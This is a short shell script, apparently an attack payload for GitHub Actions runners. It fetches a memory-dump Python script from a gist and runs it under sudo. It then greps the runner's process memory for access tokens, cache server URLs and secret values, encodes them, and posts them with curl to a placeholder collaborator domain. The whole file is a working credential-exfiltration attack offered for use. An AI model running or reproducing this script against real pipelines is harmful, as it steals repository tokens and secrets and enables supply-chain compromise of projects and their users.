echo "I'm running"
#!/bin/sh

# Replace with collaborator domain.
YOUR_EXFIL="<YOUR-COLLABORATOR-DOMAIN>"

# Exfiltrating the token and the cache server url
BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"AccessToken":"[^"]*"\}' | sort -u`
BLOB2=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"CacheServerUrl":"[^"]*"\}' | sort -u`
curl -s -d "$BLOB $BLOB2" https://$YOUR_EXFIL/cache > /dev/null

# Exfiltrating the Github token from memory
B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`

curl -s -d "$B64_BLOB" https://$YOUR_EXFIL/token > /dev/null